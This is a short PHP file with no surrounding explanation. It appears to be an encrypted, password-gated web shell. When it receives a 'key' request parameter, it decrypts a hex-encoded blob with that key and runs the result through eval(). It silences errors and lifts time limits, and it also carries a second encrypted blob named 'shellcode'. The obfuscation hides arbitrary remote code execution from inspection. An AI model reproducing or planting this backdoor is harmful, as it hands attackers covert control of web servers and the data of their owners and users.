<?php
error_reporting(0);
set_time_limit(0);
function decrypt($ciphertext_hex,$key){
$key=md5($key);
$iv_size = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC);
$iv = mcrypt_create_iv($iv_size, MCRYPT_RAND);
$ciphertext_dec = pack("H*",$ciphertext_hex);
$iv_dec = substr($ciphertext_dec, 0, $iv_size);
$ciphertext_dec = substr($ciphertext_dec, $iv_size);
$plaintext_dec = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $key,$ciphertext_dec, MCRYPT_MODE_CBC, $iv_dec);
return trim($plaintext_dec);
}
if(@$_REQUEST['key']){
$key=$_REQUEST['key'];
$hash='bd40dd58f44adc5c334e53418ea1bcd591521d60662c6753b89dc46bb02b1ecb02bf857eaa0ea5d5a36ecf638d65c55eb9a8f2b17ceb2d740e3eba7792d3995b7d4fdbdf9f5f90b219cf955539b169a40109ff496262cbc21050e6993d1f9a6a678990e0b01a03617dd4b38358d78e9a67eabe8b288487a96ca55a94e8d6614a';
$shellcode='12ec445a8c4be78007d08367455c60d571c3509ba62d1f2b321fa824667345ff3131b02b81c8ad646ffc3360e60d19d3f7f43b7b21f5bca05d6e7abfc2461b5d72fffb22659aa08655cdd8734baa0fd47b93a5659348954f853d3a68022fb3422a3832efa04792c1a81680e5aa8081716f169e05afb332a26fbd0f76ae8905b9a068ddb54f3ae107ba673362835951f4953db1079b6a3c0b4eb20ca96a241936244947ee67e0d563d8b2eee439cc5ba21151ae520eec0a663f092f9845918c7d6630764dad77808e376e099008403b01c491399da5cb3c8926c29b1bf89e8c751fb33a850c608b20e4c41cf28ec8b8060a30a827b43cd301d9c587863ce39f2326345a0217110fc898acb6c3343f3ce8';
eval(decrypt($hash,$key));
}else{
echo 'ERROR!';
}
